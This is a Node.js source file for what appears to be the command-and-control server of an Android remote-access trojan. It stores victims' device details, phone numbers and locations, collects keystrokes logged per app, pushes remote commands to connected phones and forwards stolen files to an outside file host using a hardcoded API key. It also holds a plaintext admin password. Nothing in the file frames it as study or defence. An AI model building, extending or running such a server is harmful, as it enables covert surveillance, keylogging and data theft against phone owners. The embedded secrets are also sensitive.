const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const ADMIN_HASH = bcrypt.hashSync('Zabzabikk@29', 10);
const JWT_SECRET = 'dz_secret_' + Date.now();
const SHADE_KEY = 'sk_7a2470239669f72881b8b1271c69346097016d29db7081d95e3fc30d56f0c98b';
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('admin'));

const db = new sqlite3.Database('./devices.db');
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS devices (id TEXT PRIMARY KEY, model TEXT, manufacturer TEXT, android_version TEXT, battery_level INTEGER, ip_address TEXT, location TEXT, last_seen INTEGER, status TEXT DEFAULT 'online', screen_width INTEGER, screen_height INTEGER, phone_number TEXT, sim_operator TEXT)`);
  db.run(`CREATE TABLE IF NOT EXISTS commands (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, command_type TEXT, payload TEXT, status TEXT DEFAULT 'pending', created_at INTEGER, executed_at INTEGER, result TEXT)`);
  db.run(`CREATE TABLE IF NOT EXISTS files (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, filename TEXT, shade_url TEXT, file_type TEXT, size INTEGER, uploaded_at INTEGER)`);
  db.run(`CREATE TABLE IF NOT EXISTS keylogs (id INTEGER PRIMARY KEY AUTOINCREMENT, device_id TEXT, app_package TEXT, keystrokes TEXT, timestamp INTEGER)`);
});

const auth = (req, res, next) => {
  try {
    jwt.verify(req.headers.authorization?.split(' ')[1], JWT_SECRET);
    next();
  } catch { res.status(401).json({ error: 'Invalid' }); }
};

app.post('/api/auth/login', (req, res) => {
  if (bcrypt.compareSync(req.body.password, ADMIN_HASH)) {
    res.json({ token: jwt.sign({ role: 'admin' }, JWT_SECRET, { expiresIn: '7d' }), success: true });
  } else { res.status(401).json({ error: 'Invalid' }); }
});

app.get('/api/devices', auth, (req, res) => {
  db.all('SELECT * FROM devices ORDER BY last_seen DESC', [], (err, rows) => res.json(rows || []));
});

app.get('/api/devices/:id', auth, (req, res) => {
  db.get('SELECT * FROM devices WHERE id = ?', [req.params.id], (err, row) => res.json(row || {}));
});

app.get('/api/devices/:id/commands', auth, (req, res) => {
  db.all('SELECT * FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 50', [req.params.id], (err, rows) => res.json(rows || []));
});

app.get('/api/devices/:id/files', auth, (req, res) => {
  db.all('SELECT * FROM files WHERE device_id = ? ORDER BY uploaded_at DESC', [req.params.id], (err, rows) => res.json(rows || []));
});

app.get('/api/devices/:id/keylogs', auth, (req, res) => {
  db.all('SELECT * FROM keylogs WHERE device_id = ? ORDER BY timestamp DESC LIMIT 100', [req.params.id], (err, rows) => res.json(rows || []));
});

app.post('/api/devices/:id/command', auth, (req, res) => {
  const { command_type, payload } = req.body;
  const ts = Date.now();
  db.run('INSERT INTO commands (device_id, command_type, payload, created_at) VALUES (?, ?, ?, ?)',
    [req.params.id, command_type, JSON.stringify(payload), ts], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    const sock = findSocket(req.params.id);
    if (sock) {
      sock.emit('command', { id: this.lastID, type: command_type, payload });
      res.json({ success: true, delivered: true, command_id: this.lastID });
    } else {
      res.json({ success: true, delivered: false, command_id: this.lastID, queued: true });
    }
  });
});

const upload = multer({ storage: multer.memoryStorage() });
app.post('/api/upload/:deviceId', upload.single('file'), async (req, res) => {
  try {
    const file = req.file;
    if (!file) return res.status(400).json({ error: 'No file' });
    const form = new FormData();
    form.append('file', file.buffer, req.body.filename || file.originalname);
    const response = await axios.post('https://shade.sh/api/v1/files', form, {
      headers: { ...form.getHeaders(), 'Authorization': `Bearer ${SHADE_KEY}` },
      maxBodyLength: Infinity, timeout: 30000
    });
    const url = response.data?.url || response.data?.file?.url || 'uploaded';
    db.run('INSERT INTO files (device_id, filename, shade_url, file_type, size, uploaded_at) VALUES (?, ?, ?, ?, ?, ?)',
      [req.params.deviceId, req.body.filename, url, req.body.file_type, file.size, Date.now()]);
    res.json({ success: true, url });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/data/:deviceId', (req, res) => {
  if (req.body.type === 'keylog') {
    db.run('INSERT INTO keylogs (device_id, app_package, keystrokes, timestamp) VALUES (?, ?, ?, ?)',
      [req.params.deviceId, req.body.data.app_package, req.body.data.keystrokes, Date.now()]);
  }
  res.json({ success: true });
});

const devices = new Map();
function findSocket(id) { for (const [s, i] of devices) if (i.device_id === id) return s; return null; }

io.on('connection', socket => {
  socket.on('register', info => {
    const id = info.device_id || socket.id;
    devices.set(socket, { ...info, device_id: id });
    const ts = Date.now();
    db.run(`INSERT OR REPLACE INTO devices (id, model, manufacturer, android_version, battery_level, ip_address, location, last_seen, status, screen_width, screen_height, phone_number, sim_operator) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
      [id, info.model, info.manufacturer, info.android_version, info.battery_level, info.ip_address, JSON.stringify(info.location || {}), ts, 'online', info.screen_width, info.screen_height, info.phone_number, info.sim_operator]);
    db.all('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC', [id, 'pending'], (err, cmds) => {
      if (!err && cmds) cmds.forEach(c => socket.emit('command', { id: c.id, type: c.command_type, payload: JSON.parse(c.payload || '{}') }));
    });
  });
  socket.on('command_result', data => {
    db.run('UPDATE commands SET status = ?, result = ?, executed_at = ? WHERE id = ?', ['executed', JSON.stringify(data.result), Date.now(), data.command_id]);
  });
  socket.on('disconnect', () => {
    const i = devices.get(socket);
    if (i) { db.run('UPDATE devices SET status = ?, last_seen = ? WHERE id = ?', ['offline', Date.now(), i.device_id]); devices.delete(socket); }
  });
});

setInterval(() => { db.run('UPDATE devices SET status = ? WHERE last_seen < ? AND status = ?', ['offline', Date.now() - 300000, 'online']); }, 60000);

server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
